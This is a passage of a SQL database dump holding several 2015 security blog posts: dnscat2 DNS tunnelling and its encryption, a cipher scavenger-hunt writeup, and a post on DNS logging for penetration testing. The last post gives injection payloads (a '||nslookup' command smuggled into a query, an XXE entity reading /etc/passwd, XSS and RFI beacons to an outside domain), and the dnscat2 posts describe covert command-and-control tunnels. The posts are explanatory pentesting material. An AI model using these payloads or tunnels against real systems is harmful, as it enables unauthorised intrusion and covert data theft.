1\r\nSession 1 security: ENCRYPTED BUT *NOT* VALIDATED\r\nFor added security, please ensure the client displays the same string:\r\n\r\n>> Encode Surfs Taking Spiced Finer Sonny\r\n\r\ndnscat2> session -i 1\r\n[...]\r\ndnscat2> listen 8080 www.google.com:80\r\nListening on 0.0.0.0:8080, sending connections to www.google.com:80\r\n\nNow the dnscat2 server is listening on port 8080. It\'ll continue listening on that port until the session closes.\nThe dnscat2 client, however, has no idea what\'s happening yet! The client doesn\'t know what\'s happening until it\'s actually told to connect to something with a TUNNEL_CONNECT message (which will be discussed later).\nNow we can connect to the server on port 8080 and request a page:\n\r\n$ echo -ne \'HEAD / HTTP/1.0\\r\\n\\r\\n\' | nc -vv localhost 8080\r\nlocalhost [127.0.0.1] 8080 (http-alt) open\r\nHTTP/1.0 200 OK\r\nDate: Thu, 24 Dec 2015 16:28:27 GMT\r\nExpires: -1\r\nCache-Control: private, max-age=0\r\n[...]\r\n\nOn the server, we see the request going out:\n\r\ncommand (ankh) 1> listen 8080 www.google.com:80\r\nListening on 0.0.0.0:8080, sending connections to www.google.com:80\r\ncommand (ankh) 1>\r\nConnection from 127.0.0.1:60480; forwarding to www.google.com:80...\r\n[Tunnel 0] connection successful!\r\n[Tunnel 0] closed by the other side: Server closed the connection!\r\nConnection from 123.151.42.61:48904; forwarding to www.google.com:80...\r\n\nAnd you also see very similar messages on the client:\n\r\nGot a command: TUNNEL_CONNECT [request] :: request_id 0x0001 :: host www.google.com :: port 80\r\n[[ WARNING ]] :: [Tunnel 0] connecting to www.google.com:80...\r\n[[ WARNING ]] :: [Tunnel 0] connected to www.google.com:80!\r\n[[ WARNING ]] :: [Tunnel 0] connection to www.google.com:80 closed by the server!\r\n\nThat\'s pretty much all you need to know! One more quick example:\nTo forward a ssh connection to an internal machine:\n\r\ncommand (ankh) 1> listen 127.0.0.1:2222 192.168.1.100:22\r\n\nFollowed by ssh -p2222 root@localhost. That\'ll connect to 192.168.1.100 on port 22, via the dnscat client!\nStopping a session\nI frequently used auto-commands while testing this feature:\n\r\nruby ./dnscat2.rb --dnsport=53531 --security=open --auto-attach --auto-command=\"listen 2222 www.javaop.com:22;listen 1234 www.google.ca:1234;listen 4444 localhost:5555\" --packet-trace\r\n\nThe problem is that I\'d connect with a client, hard-kill it with ctrl-c (so it doesn\'t tell the server it\'s gone), then start another one. When the second client connects, the server won\'t be able to listen anymore:\n\r\nListening on 0.0.0.0:4444, sending connections to localhost:5555\r\nSorry, that address:port is already in use: Address already in use - bind(2)\r\n\r\nIf you kill a session from the root window with the \'kill\'\r\ncommand, it will free the socket. You can get a list of which\r\nsockets are being used with the \'tunnels\' command!\r\n\r\nI realize this is super awkward.. don\'t worry, it\'ll get\r\nbetter next version! Stay tuned!\r\n\nIf you know which session is the problem, it\'s pretty easy.. just kill it from the main window (Window 0 - press ctrl-z to get there):\n\r\ndnscat2> kill 1\r\nSession 1 has been sent the kill signal!\r\nSession 1 killed: No reason given\r\n\nIf you don\'t know which session it is, you have to go into each session and run tunnels to figure out which one is holding the port open:\n\r\ndnscat2> session -i 1\r\n[...]\r\ncommand (ankh) 1> tunnels\r\nTunnel listening on 0.0.0.0:2222\r\nTunnel listening on 0.0.0.0:1234\r\nTunnel listening on 0.0.0.0:4444\r\n\nOnce that\'s done, you can either use the \'shutdown\' command (if the session is still active) or go back to the main window and use the kill command.\nI realize that\'s super awkward, and I have a plan to fix it. It\'s going to require some refactoring, though, and it won\'t be ready for a few more days. And I really wanted to get this release out before Christmas!\nImplementation details\nAs usual, the implementation is documented in detail in the protocol.md and command_protocol.md docs.\nBasically, I extended the \"command protocol\", which is the protocol that\'s used for commands like upload, download, ping, shell, exec, etc.\nTraditionally, the command protocol was purely the server making a request and the client responding to the request. For example, \"download /etc/passwd\" \"okay, here it is\". However, the tunnel protocol works a bit differently, because either side can send a request.\nUnfortunately, the client sending a request to the server, while it was something I\'d planned and written code for, had a fatal flaw: there was no way to identify a request as a request, and therefore when the client sent a request to the server it had to rely on some rickety logic to determine if it was a request or not. As a result, I made a tough call: I broke compatibility by adding a one-bit \"is a response?\" field to the start of request_id - responses now have the left-most bit set of the request_id.\nAt any time - presumably when a connection comes in, but we\'ll see what the future holds! - the server can send a TUNNEL_CONNECT request to the client, which contains a hostname and port number. That tells the client to make a connection to that host:port, which it attempts to do. If the connection is successful, the client responds with a TUNNEL_CONNECT response, which simply contains the tunnel_id.\nFrom then on, data can be sent in either direction using TUNNEL_DATA requests. This is the first time the client has been able to send a request to the server, and is also the first time a message was defined that doesn\'t have a response - neither side should (or can) respond to a TUNNEL_DATA message. Which is fine, because we have guaranteed delivery from lower level protocols.\nWhen either side decides to terminate the connection, it sends a TUNNEL_CLOSE request, which contains a tunnel_id and a reason string.\nOne final implementation detail: tunnel_ids are local to a session.\nFuture plans\nAs I said at the start, I\'ve implemented ssh -L. My next plans are to implement ssh -D (easysauce!) and ssh -R (hardersauce!). I also have some other fun ideas on what I can do with the tunnel protocol, so stay tuned for that. :)\nThe tricky part about ssh -R is keeping it secure. The client shouldn\'t be able to arbitrarily forward connections via the server - the server should be able to handle malicious clients securely, at least by default. Therefore, it\'s going to require some extra planning and architecting!\nConclusion\nAnd yeah, that\'s pretty much it! As always, if you like this blog or the work I\'m doing on dnscat2, you can support me on Patreon! Seriously, I have no ads or monetization on my site, and I spend more money on hosting password lists than I make off it, so if you wanna be awesome and help out, I really, really appreciate it! :)\nAnd as always, I\'m happy to answer questions or take feature requests! You\'re welcome to email me, reply to this blog, or file an issue on Github!', '\'DNS\', \'Hacking\', \'Tools\'', 'https://blog.skullsecurity.org/2015/dnscat2-0-05-with-tunnels');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (6, 'SANS Hackfest writeup: Hackers of Gravity', 'Ron Bowes', '2015-12-22', 'Last weekA few weeks ago, SANS hosted a private event at the Smithsonian\'s Air and Space Museum as part of SANS Hackfest. An evening in the Air and Space Museum just for us! And to sweeten the deal, they set up a scavenger hunt called \"Hackers of Gravity\" to work on while we were there!\nWe worked in small teams (I teamed up with Eric, who\'s also writing this blog with me). All they told us in advance was to bring a phone, so every part of this was solved with our phones and Google.\nEach level began with an image, typically with a cipher embedded in it. After decoding the cipher, the solution and the image itself were used together to track down a related artifact.\nThis is a writeup of that scavenger hunt. :)\n\nChallenge 1: Hacker of Tenacity\nThe order of the challenges was actually randomized, so this may not be the order that anybody else had (homework: there are 5040 possible orderings of challenges, and about 100 people attending; what are the odds that two people had the same order? The birthday paradox applies).\nThe first challenge was simply text:\n\r\nSometimes tenacity is enough to get through a difficult challenge. This Hacker of Gravity never gave up and even purposefully created discomfort to survive their challenge against gravity. Do you possess the tenacity to break this message? \r\n\r\nT05ZR1M0VEpPUlBXNlpTN081VVdHMjNGT0pQWEdaTEJPUlpRPT09PQ==\r\n\nBased on the character set, we immediately recognized it as Base64. We found an online decoder and it decoded to:\nONYGS4TJORPW6ZS7O5UWG23FOJPXGZLBORZQ====\n￼￼\nWe recognized that as Base32 - Base64 will never have four \"====\" signs at the end, and Base32 typically only contains uppercase characters and numbers. (Quick plug: I\'m currently working on Base32 support for dnscat2, which is another reason I quickly recognized it!)\nAnyway, the Base32 version decoded to spirit_of_wicker_seats, and Eric recognized \"Spirit\" as a possible clue and searched for \"Spirit of St Louis Wicker Seats\", which revealed the following quote from the Wikipedia article on the Spirit of St. Louis: \"The stiff wicker seat in the cockpit was also purposely uncomfortable\".\n\nThe Spirit of St. Louis was one of the first planes we spotted, so we scanned the QR code and found the solution: lots_of_fuel_tanks! \nChallenge 2: Hacker of Navigation\nWe actually got stuck on the second challenge for awhile, but eventually we got an idea of how these challenges tend to work, after which we came back to it.\nWe were given a fragment of a letter:\n\nThe museum archives have located part of a letter in an old storage locker from some previously lost collection. They\'d REALLY like your help finding the author.\n\n\nYou\'ll note at the bottom-left corner it implies that \"A = 50 degrees\". We didn\'t notice that initially. :)\nWhat we did notice was that the degrees were all a) multiples of 10, and b) below 260. That led us to believe that they were numbered letters, times ten (so A = 10, B = 20, C = 30, etc).\nThe numbers were: 100 50 80 90 80 100 50 230 120 130 190 180 130 230 240 50.\nDividing by 10 gives 10 5 8 9 8 10 5 23 12 13 19 18 13 23 24 5.\nConverting that to the corresponding letters gave us JEHIH JEWLMSRMWXE. Clearly not an English sentence, but it looks like a cryptogram (JEHIH looks like \"THERE\" or \"WHERE\").\nThat\'s when we noticed the \"A = 50\" in the corner, and realized that things were probably shifted by 5. Instead of manually converting it, we found a shift cipher bruteforcer that we could use. The result was: FADED FASHIONISTA\nSearching for \"Faded Fashionista Air and Space\" led us to this Smithsonian Article: Amelia Earhart, Fashionista. Neither of us knew where her exhibit was, but eventually we tracked it down on the map and walked around it until we found her Lockheed Vega, the QR code scanned to amelias_vega. \n\nChallenge 3: Hacker of Speed\nThis was an image of some folks ready to board a plane or something:\n\nThis super top secret photo has been censored. The security guys looked at this SO fast, maybe they missed something? \n\n\nBecause of the hint, we started looking for mistakes in the censoring and noticed that they\'re wearing boots that say \"X-15\":\n \nWe found pictures of the X-15 page on the museum\'s Web site and remembered seeing the plane on the 2nd floor. We reached the artifact and determined that the QR code read faster_than_superman. \nOnce we got to the artifact, we noticed that we hadn\'t broken the code yet. Looking carefully at the image, we saw the text at the bottom, nbdi_tjy_qpjou_tfwfo_uxp.\nAs an avid cryptogrammer, I recognized tfwfo as likely being \"never\". Since \'e\' is one character before \'f\', it seemed likely that it was a single shift (\'b\'->\'a\', \'c\'->\'b\', etc). I mentally shifted the first couple letters of the sentence, and it looked right, so I did the entire string while Eric wrote it down: mach_six_point_seven_two.\nThe funny thing is, the word was \"seven\", not \"never\", but the \"e\"s still matched!\nChallenge 4: Hacker of Design\n\nWhile researching some physics based penetration testing, you find this interesting diagram. You feel like you\'ve seen this device before... maybe somewhere or on something in the Air and Space museum? \n\n\nThe diagram reminded Eric of an engine he saw on an earlier visit, we found the artifact on the other side of the museum: \n\nUnfortunately there was no QR code so we decided to work on decoding the challenge to discover the location of the artifact. \nNow that we\'d seen the hint on Challenge 2, we were more prepared for a diagram to help us! In this case, it was a drawing of an atom and the number \"10\". We concluded that the numbers probably referred to the atomic weight for elements on the periodic table, and converted them as such:\n\n10=>Ne\n74=>W\n... and so on.\nAfter decoding the full string, we ended up with:\nnew_plan_schwalbe\nWe actually made a mistake in decoding the string, but managed to find it anyways thanks to search autocorrect. :)\nAfter searching for \"schwalbe air and space\", we found this article, which led us to the artifact: the Messerschmitt Me 262 A-1a Schwalbe (Swallow). The QR code scanned revealed the_swallow.\n\n\nChallenge 5: Hacker of Distance\nWhile at the bar, listening to some Dual Core, planning your next conference-fest with some fellow hackers, you find this interesting napkin. Your mind begins to wander. Why doesn\'t Dual Core have a GOLDEN RECORD?! Also, is this napkin trying to tell you something in a around-about way?\n\n\nThe hidden text on this one was obvious… morse code! Typing the code into a phone (not fun!), we ended up with .- -.. .- ... - .-. .- .--. . .-. .- ... .--. . .-. .-, which translates to ADASTRAPERASPERA\nAccording to Google, that slogan is used by a thousand different organizations, none of which seemed to be space or air related. However, searching for \"Golden Record Air and Space\" returned several results for the Voyager space probe. We looked at our map and scurried to the exhibit on the other side of the museum: \n\nOnce we made it to the exhibit finding the QR code was easy, scanning it revealed, the_princess_is_in_another_castle. The decoy flag!\nWe tried searching keywords from the napkin but none of the results seemed promising. After a few frustrating minutes we saw the museum banquet director and asked him for help. He told us that the plane we were looking for was close to the start of the challenge, we made a dash for the first floor and found the correct Voyager exhibit: \n\nScanning the QR code revealed the code, missing_canards.\nChallenge 6: Hacker of Guidance\nThe sixth challenge gave us a map with some information:\n\nYou have intercepted this map that appears to target something. The allies would really like to know the location of the target. Also, they\'d like to know what on Earth is at that location. \n\n\nWe immediately noticed the hex-encoded numbers on the left:\n\r\n35342e3133383835322c\r\n31332e373637373235\r\n\nWhich translates to 54.138852,13.767725. We googled the coordinates, and it turned out to be a location in Germany: Flughafenring, 17449 Peenemünde, Germany.\nAfter many failed searches we tried \"Peenemünde ww2 air and space\", which led to a reference to the German V2 Rocket. Here is the exhibit and QR code: \n\nScanning the QR code revealed aggregat_4, the formal name for the V-2 rocket. \nChallenge 7: Hacker of Coding\nThis is an image with a cipher on the right:\n\nYour primary computer\'s 0.043MHz CPU is currently maxed out with other more important tasks, so converting all these books of source code to assembly is entirely up to you.\n\n\nOn the chalkboard is a cipher:\n\nWe couldn\'t remember what it was called, and ended up searching for \"line dot cipher\", which immediately identified it as a pigpen cipher. The pigpen cipher can be decoded with this graphic:\n\nEssentially, you find the shape containing the letter that corresponds to the shape in that graphic. So, the first letter is \">\" on the chalkboard, which maps to \'T\'. The second is the upper three quarters of a square, which matches up with \'H\', and the third is a square, which matches to E. And so on.\nInitially we found a version that didn\'t map to the proper English characters, and translated it to:\n\nLater, we did it right and found the text \"THE BEST SHIP TO COME DOWN THE LINE\"\nTo find the artifact, we googled \"0.043MHz\", and immediately discovered it was \"Apollo 11\". \n\nThe QR code scanned to the_eleventh_apollo\nAnd that\'s it!\nAnd that\'s the end of the cipher portion of the challenge! We were first place by only a few minutes. :)\nThe last part of the challenge involved throwing wood airplanes. Because our plane didn\'t go backwards, it wasn\'t the worst, but it\'s nothing to write home about!\nBut in the end, it was a really cool way to see a bunch of artifacts and also break some codes!', '\'Conferences\'', 'https://blog.skullsecurity.org/2015/sans-hackfest-writeup-hackers-of-gravity');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (7, 'dnscat2: now with crypto!', 'Ron Bowes', '2015-11-17', 'Hey everybody,\nLive from the SANS Pentest Summit, I\'m excited to announce the latest beta release of dnscat2: 0.04! Besides some minor cleanups and UI improvements, there is one serious improvement: all dnscat2 sessions are now encrypted by default!\nRead on for some user information, then some implementation details for those who are interested! For all the REALLY gory information, check out the protocol doc!\n\nTell me what\'s new!\nBy default, when you start a dnscat2 client, it now performs a key exchange with the server, and uses a derived session key to encrypt all traffic. This has the huge advantage that passive surveillance and IDS and such will no longer be able to see your traffic. But the disadvantage is that it\'s vulnerable to a man-in-the-middle attack - assuming somebody takes the time and effort to perform a man-in-the-middle attack against dnscat2, which would be awesome but seems unlikely. :)\nBy default, all connections are encrypted, and the server will refuse to allow cleartext connections. If you start the server with --security=open (or run set security=open), then the client decides the security level - including cleartext.\nIf you pass the server a --secret string (see below), then the server will require clients to authenticate using the same --secret value. That can be turned off by using --security=open or --security=encrypted (or the equivalent set commands).\nLet\'s look at the man-in-the-middle protection...\nShort authentication strings\nFirst, by default, a short authentication string is displayed on both the client and the server. Short authentication strings, inspired by ZRTP and Silent Circle, are a visual way to tell if you\'re the victim of a man-in-the-middle attack.\nEssentially, when a new connection is created, the user has to manually match the short authentication strings on the client and the server. If they\'re the same, then it\'s a legit connection. Here\'s what it looks like on the client:\n\r\nEncrypted session established! For added security, please verify the server also displays this string:\r\n\r\nTort Hither Harold Motive Nuns Unwrap\r\n\nAnd the server:\n\r\nNew window created: 1\r\nSession 1 security: ENCRYPTED BUT *NOT* VALIDATED\r\nFor added security, please ensure the client displays the same string:\r\n\r\n>> Tort Hither Harold Motive Nuns Unwrap\r\n\nThere are 256 different possible words, so six words gives 48 bits of protection. While a 48-bit key can eventually be bruteforced, in this case it has to be done in real time, which is exceedingly unlikely.\nAuthentication\nAlternatively, a pre-shared secret can be used instead of a short authentication string. When you start the server, you pass in a --secret value, such as --secret=pineapple. Clients with the same secret will create an authenticator string based on the password and the cryptographic keys, and send it to the server, encrypted, after the key exchange. Clients that use the wrong key will be summarily rejected.\nDetails on how this is implemented are below.\nHow stealthy is it?\nTo be perfectly honest: not completely.\nThe key exchange is pretty obvious. A 512-bit value has to be sent via DNS, and a 512-bit response has to come back. That\'s pretty big, and stands out.\nAfter that, every packet has an unencrypted 40-bit (5-byte) header and an unencrypted 16-bit (2-byte) nonce. The header contains three bytes that don\'t really change, and the nonce is incremental. Any system that knows to look for dnscat2 will be able to find that.\nIt\'s conceivable that I could make this more stealthy, but anybody who\'s already trying to detect dnscat2 traffic will be able to update the signatures that they would have had to write anyway, so it becomes a cat-and-mouse game.\nOf course, that doesn\'t stop people from patching things. :)\nThe plus side, however, is that none of your data leaks! And somebody would have to be specifically looking for dnscat2 traffic to recognize it.\nWhat are the hidden costs?\nEncrypted packets have 64 bits (8 bytes) of extra overhead: a 16-bit (two-byte) nonce and a 48-bit (six-byte) signature on each packet. Since DNS packets have between 200 and 250 bytes of payload space, that means we lose ~4% of our potential bandwidth.\nAdditionally, there\'s a key exchange packet and potentially an authentication packet. That\'s two extra roundtrips over a fairly slow protocol.\nOther than that, not much changes, really. The encryption/decryption/signing/validation are super fast, and it uses a stream cipher so the length of the messages don\'t change.\nHow do I turn it off?\nThe server always supports crypto; if you don\'t WANT crypto, you\'ll have to manually hack the server or use a version of dnscat2 server <=0.03. But you\'ll have to manually turn off encryption in the client; otherwise, the connection fail.\nSpeaking of turning off encryption in the client: you can compile without encryption by using make nocrypto. You can also disable encryption at runtime with dnscat2 --no-encryption. On Visual Studio, you\'ll have to define \"NO_ENCRYPTION\". Note that the server, by default, won\'t allow either of those to connect unless you start it with --security=open.\nGive me some technical details!\nYour best bet if you\'re REALLY curious is to check out the protocol doc, where I document the protocol in full.\nBut I\'ll summarize it here. :)\nThe client starts a session by initiating a key exchange with the server. Both sides generate a random, 256-bit private key, then derive a public key using Elliptic Curve Diffie Hellman (ECDH). The client sends the public key to the server, the server sends a public key to the client, and they both agree on a shared secret.\nThat shared secret is hashed with a number of different values to derive purpose-specific keys - the client encryption key, the server encryption key, the client signing key, the server signing key, etc.\nOnce the keys are agreed upon, all packets are encrypted and signed. The encryption is salsa20 and uses one of the derived keys as well as an incremental nonce. After being encrypted, the encrypted data, the nonce, and the packet header are signed using SHA3, but truncated to 48 bits (6 bytes). 48 bits isn\'t very long for a signature, but space is at an extreme premium and for most attacks it would have to be broken in real time.\nAs an aside: I really wanted to encrypt the header instead of just signing it, but because of protocol limitations, that\'s simply not possible (because I have no way of knowing which packets belong to which session, the session_id has to be plaintext).\nImmediately after the key exchange, the client optionally sends an authenticator over the encrypted session. The authenticator is based on a pre-shared secret (passed on the commandline) that the client and server pre-arrange in some way. That secret is hashed with both public keys and the secret (derived) key, as well as a different static string on the client and server. The client sends their authenticator to the server, and the server sends their authenticator to the client. In that way, both sides verify each other without revealing anything.\nIf the client doesn\'t send the authenticator, then a short authentication string is generated. It\'s based on a very similar hash to the authenticator, except without the pre-shared secret. The first 6 bytes are converted into words using a list of 256 English words, and are displayed on the screen. It\'s up to the user to verify them.\nBecause the nonce is only 16 bits, only 65536 roundtrips can be performed before running out. As such, the client may, at its own discretion (but before running out), initiate a new key exchange. It\'s identical to the original key exchange, except that it happens in a signed and encrypted packet. After the renegotiation is finished, both the client and server switch their nonce values back to 0 and stop accepting packets with the old keys.\nAnd... that\'s about it! Keys are exchanged, an authenticator is sent or a short authentication string is displayed, all messages are signed and encrypted, and that\'s that!\nChallenges\nA few of the challenges I had to work through...\n\nBecause DNS has no concept of connections/sessions, I had to expose more information that I wanted in the packets (and because it\'s extremely length-limited, I had to truncate signatures)\nI had originally planned to use Curve25519 for the key exchange, but there\'s no Ruby implementation\nFinding a C implementation of ECC that doesn\'t require libcrypto or libssl was really hard\nFinding a working SHA3 implementation in Ruby was impossible! I filed bugs against the three more popular implementations and one of them actually took the time to fix it!\nDealing with DNS\'s gratuitous retransmissions and accidental drops was super painful and required some hackier code than I like to see in crypto (for example, an old key can still be used, even after a key exchange, until the new one is used successfully; the more secure alternative can\'t handle a dropped response packet, otherwise both peers would have different keys)\n\nShouts out\nI just wanted to do a quick shout out to a few friends who really made this happen by giving me advice, encouragement, or just listening to me complaining.\nSo, in alphabetical order so nobody can claim I play favourites, I want to give mad propz to:\n\nAlex Weber, who notably convinced me to use a proper key exchange protocol instead of just a static key (and who also wrote the Salsa20 implementation I used\nBrandon Enright, who give me a ton of handy crypto advice\nEric Gershman, who convinced me to work on encryption in the first place, and who listened to my constant complaining about how much I hate implementing crypto', '\'Conferences\', \'DNS\', \'Hacking\', \'Tools\'', 'https://blog.skullsecurity.org/2015/dnscat2-now-with-crypto');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (8, 'Why DNS is awesome and why you should love it', 'Ron Bowes', '2015-8-17', 'It\'s no secret that I love DNS. It\'s an awesome protocol. It\'s easy to understand and easy to implement. It\'s also easy to get dangerously wrong, but that\'s a story for last weeka few weeks ago. :)\nI want to talk about interesting implication of DNS\'s design decisions that benefit us, as penetration testers. It\'s difficult to describe these decisions as good or bad, it\'s just what we have to work with.\nWhat I DON\'T want to talk about today is DNS poisoning or spoofing, or similar vulnerabilities. While cool, it generally requires the attacker to take advantage of poorly configured or vulnerable DNS servers.\nTechnically, I\'m also releasing a tool I wrote a couple weeks ago: dnslogger.rb that replaces an old tool I wrote a million years ago.\n\nRecursive? Authoritative? Wut?\nAs always, I\'ll start with some introduction to how DNS works. If you already know DNS, you can go ahead and skip to the next section.\nDNS is recursive. That means that if you ask a server about a domain it doesn\'t know about (that is, a domain that isn\'t cached or a domain that the server isn\'t the authority for), it\'ll either pass it upstream to another DNS server (recursive) or tell you where to go for the answer (non-recursive). As always, we\'ll focus on recursive DNS servers - they\'re the fun ones!\nIf no interim DNS server has the entry cached, the request will eventually make it all the way to the authoritative server for the domain. For example, the authoritative server for *.skullseclabs.org is 206.220.196.59 - my server (and hopefully the server you\'re reading this on :) ). That is, any request that ends with skullseclabs.org - and that isn\'t cached - will eventually go to my server. See the next section for information on how to set up your own authoritative DNS server.\nLet\'s look at a typical setup. You\'re on your home network. Your router\'s ip address is probably the usual 192.168.1.1, and is plugged into a cable modem. When you connect your laptop to your network, DHCP (aka, magic) happens, and your DNS server probably gets set to 192.168.1.1 (unless you\'ve manually configured it to 8.8.8.8, which you should). When your router connects to your cable modem, more DHCP (aka, more magic) happens, and its DNS server set to the ISP\'s DNS server.\nWhen you do a lookup, like \"dig hello.skullseclabs.org\", your computer sends a DNS request to 192.168.1.1 saying \"who is hello.skullseclabs.org\"? Obviously, your router has no idea - he\'s just a stupid Linksys or whatever - so he has to forward the request to the ISP\'s DNS server.\nThe ISP\'s DNS server gets the request, and it has no idea what to do with it either. It certainly doesn\'t know who \"hello.skullseclabs.org\" is, so it\'s gonna forward the request to its DNS server, whatever that happens to be. Or it might tell the router where to look for a non-recursive query. Since at this point it\'s out of our hands, it doesn\'t really matter.\nEventually, some DNS server along the way is going to say \"hey, why don\'t we just go to the source?\", and through a process that leading scientists believe is magic (there\'s a lot of magic in DNS :) ), it will look up the authoritative server for skullseclabs.org, discover it\'s 206.220.196.59, and send the request there.\nMy server will see the request, and, assuming something is listening on UDP port 53, have the opportunity to respond.\nThe response can be any IP address for an A (IP) or AAAA (IPv6) request; a name for a CNAME (alias) or MX (mail) request; or any ol\' text for a TXT request. It can also be NXDomain - \"domain not found\" - or various error messages (like \"servfail\").\nOne of the cool things is that even if we return \"domain not found\", we still see that a request happened, even if the person doing the lookup sees that it failed! We\'ll see some examples of why that\'s cool shortly.\nHow do I get an authoritative server?\nThe sad part is, getting an authoritative server isn\'t free. You have to buy a domain, which is on the order of $10 / year, give or take.\nBeyond that, it\'s just a configuration thing. I don\'t want to spend a ton of time talking about it here, so check out this guide, written by Irvin Zhan for instructions to do it on Namecheap.\nI personally did it on Godaddy. It took some time to figure out, though, so prepare for a headache! But trust me: it\'s worth it.\nThe set up\nWe\'ll use skullseclabs.org - my test domain - for the remainder of this. Obviously, if you want to do this yourself, you\'ll need to replace that with whatever domain you registered. We\'ll also use dnslogger.rb, which you\'ll get if you clone dnscat2\'s repository.\nGetting dnslogger.rb to work is mostly easy, but permissions can be a problem. To listen on UDP/53, it has to run as root. It also needs the \"rubydns\" gem installed in a place where it can be found. That can be a little annoying, so I apologize if it\'s a pain. \"rvmsudo\" may help.\nIf anybody out there is familiar with how to properly package Ruby programs, I\'d love to chat! I\'m making this up as I go along :)\nWhat does DNS look like?\nAll right, let\'s mess around!\nI\'ll start by having no DNS server running at all on skullseclabs.org - basically, the base state. From another host, if you try to ping it, you\'ll see this:\n\r\n$ ping noserver.skullseclabs.org\r\nPing request could not find host noserver.skullseclabs.org. Please check the name and try again.\r\n\nConclusion? It\'s down. If you were investigating an incident and you saw that message, you\'d conclude that there\'s nothing there, right? Probably?\nLet\'s fire up dnslogger.rb:\n\r\n$ sudo ruby ./dnslogger.rb\r\ndnslogger v1.0.0 is starting!\r\n\r\nStarting dnslogger DNS server on 0.0.0.0:53\r\n\nThen do the same ping (with a different domain, because caching can screw you up):\n\r\n$ ping yesserver.skullseclabs.org\r\nPing request could not find host yesserver.skullseclabs.org. Please check the name and try again.\r\n\nIt\'s the exact. Same. Response. The only difference is, on the DNS server, we see this:\n\r\n$ sudo ruby ./dnslogger.rb\r\ndnslogger v1.0.0 is starting!\r\n\r\nStarting dnslogger DNS server on 0.0.0.0:53\r\nGot a request for yesserver.skullseclabs.org [type = A], responding with NXDomain\r\n\nWhat\'s this? We saw the request! Even if the person doing the lookup thought it failed, it didn\'t: WE KNOW.\nThat\'s really cool, because it\'s a really, really stealthy way to find out if somebody is looking you up. If you do a reverse DNS lookup for 206.220.196.59, you\'ll see:\n\r\n$ dig -x 206.220.196.59\r\n[...]\r\n;; ANSWER SECTION:\r\n59.196.220.206.in-addr.arpa. 3567 IN    PTR     test.skullseclabs.org.\r\n\nAnd if you look up the forward record:\n\r\n$ dig test.skullseclabs.org\r\n[...]\r\n;; ->>HEADER<\nNXDOMAIN = \"no such domain\". Totally stealth!\nWhy is it so awesome?\nLet\'s say you\'re testing for cross-site scripting on a site. Post <img src=\"pagenamegoeshere.skullseclabs.org\" /> everywhere. If you later see a request like \"adminpage.skullseclabs.org\" come in, then guess what? You found some stored XSS on their admin page!\nLet\'s say you\'re looking for shell injection. Normally, you do something like \"vulnerablesite.com/query?q=myquery||ping -c5 localhost\". If it takes 5 seconds, it\'s probably vulnerable to XSSshell command injection [thanks albinowax!]. That\'s lame. Instead, do a query for \"myquery||nslookup pagename.skullseclabs.org\". If you see the query, it\'s definitely vulnerable. If you don\'t, it\'s almost certainly not.\nLet\'s say you\'re looking for XXE. Normally, you\'d stick something like \"<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>\" into the XML. That works great - IF it returns the data. If it doesn\'t, you see nothing, and it probably failed. Probably. But if you change the \"file:///\" URL to \"http://somethingunique.skullseclabs.org\", you\'ll see the request in your DNS logs, and you can confirm it\'s vulnerable!\nLet\'s say you\'re wondering if a system is executing a binary you\'re sending across the network. Create a binary that attempts to connect to binaryname.skullseclabs.org. You\'ll instantly know if anybody attempted to run it, and in their logs they\'ll see nothing more than a failed DNS lookup. As far as they know, nothing happened!\nThe coolest thing is, if you\'re responding with NXDomain, then as far as the client or IDS/IPS/Wireshark/etc. knows, the domain doesn\'t exist and the connection doesn\'t happen. Nothing even attempts to connect - it doesn\'t even send a SYN. How could it? It just looks at the domain and \"NOPES\" right outta there.\nIf some poor server admin has to figure out what\'s happening, what\'s s/he going to see? A request to a domain which, if they ping, doesn\'t exist. At that point, they give up and declare it a false positive. What else can they do, really?\nThere are so many applications. Looking for SQL injection? Use a command that does a DNS lookup (I don\'t know enough about SQL to do this). Looking for a RFI vuln? Try to include a file from your domain. Wondering if a company will try emailing you without risking getting an email (I\'m sure I can come up with a scenario)? Give them \"thisisfake@fakeemail.skullseclabs.org\" as your email address. If I try to email that from gmail, it fails pretty much instantly:\n\r\nDelivery to the following recipient failed permanently:\r\n\r\n     thisisfake@fakeemail.skullseclabs.org\r\n\r\nTechnical details of permanent failure:\r\nDNS Error: Address resolution of fakeemail.skullseclabs.org. failed: Domain name not found\r\n\nBut I still see that they tried:\n\r\n$ sudo ruby ./dnslogger.rb\r\ndnslogger v1.0.0 is starting!\r\n\r\nStarting dnslogger DNS server on 0.0.0.0:53\r\nGot a request for fakeemail.skullseclabs.org [type = MX], responding with NXDomain\r\nGot a request for fakeemail.skullseclabs.org [type = MX], responding with NXDomain\r\nGot a request for fakeemail.skullseclabs.org [type = AAAA], responding with NXDomain\r\nGot a request for fakeemail.skullseclabs.org [type = A], responding with NXDomain\r\n\nI see the attempt, but neither gmail nor the original sender can tell that apart from a misspelled domain - because it\'s identical in every way!\n(I\'m mildly curious why it does a AAAA/A lookup - maybe somebody can look into that)\nReturning addresses\ndnslogger.rb can return more than just NXDomain - it can return actual domains! If you start dnslogger.rb with a --A argument:\n$ sudo ruby ./dnslogger.rb --A \"8.8.8.8\"\nThen it\'ll return that ip address for every A request for any domain:\n\r\n$ ping arecord.skullseclabs.org\r\n\r\nPinging arecord.skullseclabs.org [8.8.8.8] with 32 bytes of data:\r\nReply from 8.8.8.8: bytes=32 time=85ms TTL=44\r\nReply from 8.8.8.8: bytes=32 time=80ms TTL=44\r\nReply from 8.8.8.8: bytes=32 time=73ms TTL=44\r\nReply from 8.8.8.8: bytes=32 time=90ms TTL=44\r\n\r\nPing statistics for 8.8.8.8:\r\n    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),\r\nApproximate round trip times in milli-seconds:\r\n    Minimum = 73ms, Maximum = 90ms, Average = 82ms\r\n\nIf you do a lookup directly to the server, you can use any domain:\n\r\n$ dig @206.220.196.59 google.com\r\n[...]\r\n;; ANSWER SECTION:\r\ngoogle.com.             86400   IN      A       8.8.8.8\r\n\nIn the past, I\'ve found a DNS server that always returns the same thing to be useful for analyzing malware (also database software, which can often be considered the same thing). In particular, setting a system\'s DNS server to the IP of a dnslogger.rb instance, then returning 127.0.0.1 for all A records and ::1 for all AAAA records, can be a great way to analyze malware without letting it connect outbound to any 